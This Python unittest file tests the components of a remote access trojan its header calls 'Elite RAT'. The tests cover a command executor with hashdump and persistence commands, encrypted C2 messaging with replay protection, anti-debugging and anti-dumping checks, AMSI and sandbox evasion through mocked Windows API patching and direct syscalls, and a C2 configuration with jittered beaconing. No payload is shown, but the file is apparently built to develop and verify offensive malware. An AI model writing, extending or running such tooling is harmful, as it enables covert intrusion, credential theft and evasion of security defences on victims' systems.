#!/usr/bin/env python3
"""
Elite RAT Comprehensive Test Suite
Full coverage for all elite systems
"""

import unittest
import sys
import os
import json
import tempfile
from unittest.mock import Mock, patch, MagicMock

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import modules to test
from Core.elite_executor import EliteCommandExecutor
from Core.crypto_system import EliteCryptoSystem
from Core.memory_protection import MemoryProtection
from Core.advanced_evasion import AdvancedEvasion
from Core.config import EliteConfig

class TestEliteExecutor(unittest.TestCase):
    """Test Elite Command Executor"""
    
    def setUp(self):
        self.executor = EliteCommandExecutor()
    
    def test_executor_initialization(self):
        """Test executor initializes correctly"""
        self.assertIsNotNone(self.executor)
        self.assertIsInstance(self.executor.commands, dict)
    
    def test_command_loading(self):
        """Test all commands load successfully"""
        commands = self.executor.get_available_commands()
        self.assertGreater(len(commands), 60)
        self.assertIn('hashdump', commands)
        self.assertIn('persistence', commands)
    
    def test_command_execution_format(self):
        """Test command execution returns proper format"""
        # Test with a safe command
        result = self.executor.execute('pwd')
        self.assertIsInstance(result, dict)
        self.assertIn('success', result)
    
    def test_error_handling(self):
        """Test error handling for invalid commands"""
        result = self.executor.execute('nonexistent_command')
        self.assertFalse(result.get('success', False))
        self.assertIn('error', result)

class TestCryptoSystem(unittest.TestCase):
    """Test Encryption System"""
    
    def setUp(self):
        self.crypto = EliteCryptoSystem()
    
    def test_key_generation(self):
        """Test master key generation"""
        self.assertIsNotNone(self.crypto.master_key)
        self.assertEqual(len(self.crypto.master_key), 32)
    
    def test_encryption_decryption(self):
        """Test command encryption and decryption"""
        command = {'action': 'test', 'data': 'sensitive'}
        
        # Encrypt
        encrypted = self.crypto.encrypt_command(command)
        self.assertIsInstance(encrypted, str)
        
        # Decrypt
        decrypted = self.crypto.decrypt_command(encrypted)
        self.assertEqual(decrypted['action'], command['action'])
        self.assertEqual(decrypted['data'], command['data'])
    
    def test_signature_verification(self):
        """Test HMAC signature verification"""
        command = {'test': 'data'}
        encrypted = self.crypto.encrypt_command(command)
        
        # Should decrypt successfully with valid signature
        decrypted = self.crypto.decrypt_command(encrypted)
        self.assertIsNotNone(decrypted)
        
        # Tamper with data
        import base64
        tampered = base64.b64decode(encrypted)
        tampered = tampered[:-10] + b'tampered!!'
        tampered = base64.b64encode(tampered).decode()
        
        # Should fail with tampered data
        with self.assertRaises(Exception):
            self.crypto.decrypt_command(tampered)
    
    def test_replay_protection(self):
        """Test anti-replay protection"""
        command = {'action': 'test'}
        encrypted = self.crypto.encrypt_command(command)
        
        # First decryption should work
        decrypted1 = self.crypto.decrypt_command(encrypted)
        self.assertIsNotNone(decrypted1)
        
        # Same encrypted data should be rejected (replay attack)
        with self.assertRaises(Exception):
            self.crypto.decrypt_command(encrypted)
    
    def test_session_management(self):
        """Test session key management"""
        session_id = 'test_session'
        key1 = self.crypto._get_session_key(session_id)
        key2 = self.crypto._get_session_key(session_id)
        
        # Should return same key for same session
        self.assertEqual(key1, key2)
        
        # Different session should have different key
        key3 = self.crypto._get_session_key('different_session')
        self.assertNotEqual(key1, key3)
    
    def test_key_rotation(self):
        """Test key rotation"""
        old_master = self.crypto.master_key
        result = self.crypto.rotate_keys()
        
        self.assertTrue(result['rotated'])
        self.assertNotEqual(old_master, self.crypto.master_key)

class TestMemoryProtection(unittest.TestCase):
    """Test Memory Protection System"""
    
    def setUp(self):
        self.memory = MemoryProtection()
    
    def test_initialization(self):
        """Test memory protection initialization"""
        self.assertIsNotNone(self.memory)
        self.assertIsInstance(self.memory.protected_regions, list)
    
    def test_secure_wipe_strings(self):
        """Test secure wiping of strings"""
        sensitive_data = "password123"
        original_id = id(sensitive_data)
        
        # Wipe the data
        self.memory.secure_wipe(sensitive_data)
        
        # Data should be wiped (though Python strings are immutable)
        # This tests the function runs without error
        self.assertTrue(True)
    
    def test_secure_wipe_dict(self):
        """Test secure wiping of dictionaries"""
        sensitive_dict = {'password': 'secret', 'key': 'value'}
        
        self.memory.secure_wipe(sensitive_dict)
        
        # Dictionary should be empty after wipe
        self.assertEqual(len(sensitive_dict), 0)
    
    def test_secure_wipe_list(self):
        """Test secure wiping of lists"""
        sensitive_list = ['secret1', 'secret2', 'secret3']
        
        self.memory.secure_wipe(sensitive_list)
        
        # List should be empty after wipe
        self.assertEqual(len(sensitive_list), 0)
    
    def test_string_encryption(self):
        """Test string encryption in memory"""
        plaintext = "sensitive data"
        
        encrypted = self.memory.encrypt_strings(plaintext)
        self.assertIsInstance(encrypted, bytes)
        self.assertNotEqual(encrypted, plaintext.encode())
        
        decrypted = self.memory.decrypt_strings(encrypted)
        self.assertEqual(decrypted, plaintext)
    
    @patch('sys.platform', 'win32')
    def test_anti_dumping_windows(self):
        """Test anti-dumping protection on Windows"""
        # Mock Windows functions
        self.memory.kernel32 = Mock()
        self.memory.kernel32.IsDebuggerPresent.return_value = False
        
        # Should not crash
        self.memory.anti_dumping()
        self.memory.kernel32.IsDebuggerPresent.assert_called()

class TestAdvancedEvasion(unittest.TestCase):
    """Test Advanced Evasion System"""
    
    def setUp(self):
        self.evasion = AdvancedEvasion()
    
    def test_initialization(self):
        """Test evasion system initialization"""
        self.assertIsNotNone(self.evasion)
        self.assertIsInstance(self.evasion.evasion_applied, set)
    
    @patch('sys.platform', 'win32')
    def test_apply_all_evasions_windows(self):
        """Test applying all evasions on Windows"""
        # Mock Windows DLLs
        self.evasion.kernel32 = Mock()
        self.evasion.ntdll = Mock()
        self.evasion.amsi = Mock()
        
        # Mock successful evasion
        self.evasion.kernel32.GetProcAddress.return_value = 12345
        self.evasion.kernel32.VirtualProtect.return_value = True
        
        results = self.evasion.apply_all_evasions()
        
        self.assertIsInstance(results, dict)
        self.assertIn('timing_evasion', results)
        self.assertIn('environment_check', results)
    
    def test_environment_check(self):
        """Test sandbox/analysis environment detection"""
        result = self.evasion.check_environment()
        
        # Should return boolean
        self.assertIsInstance(result, bool)
    
    def test_timing_evasion(self):
        """Test timing-based evasion"""
        result = self.evasion.apply_timing_evasion()
        
        # Should succeed if not already applied
        if 'timing' not in self.evasion.evasion_applied:
            self.assertTrue(result)
            self.assertIn('timing', self.evasion.evasion_applied)
        
        # Second application should fail
        result2 = self.evasion.apply_timing_evasion()
        self.assertFalse(result2)
    
    @patch('sys.platform', 'win32')
    @patch('sys.maxsize', 2**63)  # 64-bit
    def test_direct_syscall_windows_x64(self):
        """Test direct syscall on Windows x64"""
        self.evasion.kernel32 = Mock()
        self.evasion.kernel32.VirtualAlloc.return_value = 0x1000
        self.evasion.kernel32.VirtualFree.return_value = True
        
        # Test syscall (mocked)
        result = self.evasion.direct_syscall(0x50, 1, 2, 3)
        
        # Should have allocated and freed memory
        self.evasion.kernel32.VirtualAlloc.assert_called()
        self.evasion.kernel32.VirtualFree.assert_called()

class TestConfiguration(unittest.TestCase):
    """Test Configuration System"""
    
    def setUp(self):
        self.config = EliteConfig()
    
    def test_default_config(self):
        """Test default configuration values"""
        self.assertIsNotNone(self.config.config)
        self.assertIn('c2', self.config.config)
        self.assertIn('security', self.config.config)
        self.assertIn('persistence', self.config.config)
    
    def test_get_config_value(self):
        """Test getting configuration values"""
        # Test nested path
        port = self.config.get('c2.primary_port')
        self.assertIsNotNone(port)
        
        # Test with default
        nonexistent = self.config.get('nonexistent.path', 'default')
        self.assertEqual(nonexistent, 'default')
    
    def test_set_config_value(self):
        """Test setting configuration values"""
        self.config.set_nested(['test', 'value'], 'test_data')
        result = self.config.get('test.value')
        self.assertEqual(result, 'test_data')
    
    def test_c2_url_generation(self):
        """Test C2 URL generation"""
        url = self.config.get_c2_url()
        self.assertIsInstance(url, str)
        self.assertTrue(url.startswith('http'))
    
    def test_beacon_interval_jitter(self):
        """Test beacon interval with jitter"""
        intervals = set()
        for _ in range(10):
            interval = self.config.get_beacon_interval()
            intervals.add(interval)
        
        # Should have variation due to jitter
        self.assertGreater(len(intervals), 1)
    
    def test_config_file_operations(self):
        """Test saving and loading config from file"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            temp_file = f.name
        
        try:
            # Save config
            self.config.save_to_file(temp_file)
            self.assertTrue(os.path.exists(temp_file))
            
            # Load config
            new_config = EliteConfig(temp_file)
            self.assertEqual(
                new_config.get('c2.primary_host'),
                self.config.get('c2.primary_host')
            )
        finally:
            os.unlink(temp_file)

class TestIntegration(unittest.TestCase):
    """Integration tests for system components"""
    
    def test_executor_with_crypto(self):
        """Test command executor with encryption"""
        executor = EliteCommandExecutor()
        crypto = EliteCryptoSystem()
        
        # Execute command
        command = 'pwd'
        result = executor.execute(command)
        
        # Encrypt result
        encrypted = crypto.encrypt_command(result)
        self.assertIsInstance(encrypted, str)
        
        # Decrypt and verify
        decrypted = crypto.decrypt_command(encrypted)
        self.assertEqual(decrypted.get('success'), result.get('success'))
    
    def test_config_with_executor(self):
        """Test configuration with executor"""
        config = EliteConfig()
        executor = EliteCommandExecutor()
        
        # Executor should respect config
        # This is a placeholder for actual integration
        self.assertIsNotNone(config)
        self.assertIsNotNone(executor)
    
    def test_memory_protection_with_crypto(self):
        """Test memory protection with crypto keys"""
        memory = MemoryProtection()
        crypto = EliteCryptoSystem()
        
        # Protect crypto keys in memory
        key_copy = crypto.master_key[:]
        
        # Encrypt the key in memory
        encrypted_key = memory.encrypt_strings(key_copy.hex())
        self.assertIsInstance(encrypted_key, bytes)
        
        # Decrypt when needed
        decrypted_key = memory.decrypt_strings(encrypted_key)
        self.assertEqual(decrypted_key, key_copy.hex())

def run_test_suite():
    """Run complete test suite"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestEliteExecutor))
    suite.addTests(loader.loadTestsFromTestCase(TestCryptoSystem))
    suite.addTests(loader.loadTestsFromTestCase(TestMemoryProtection))
    suite.addTests(loader.loadTestsFromTestCase(TestAdvancedEvasion))
    suite.addTests(loader.loadTestsFromTestCase(TestConfiguration))
    suite.addTests(loader.loadTestsFromTestCase(TestIntegration))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Return success status
    return result.wasSuccessful()

if __name__ == '__main__':
    success = run_test_suite()
    sys.exit(0 if success else 1)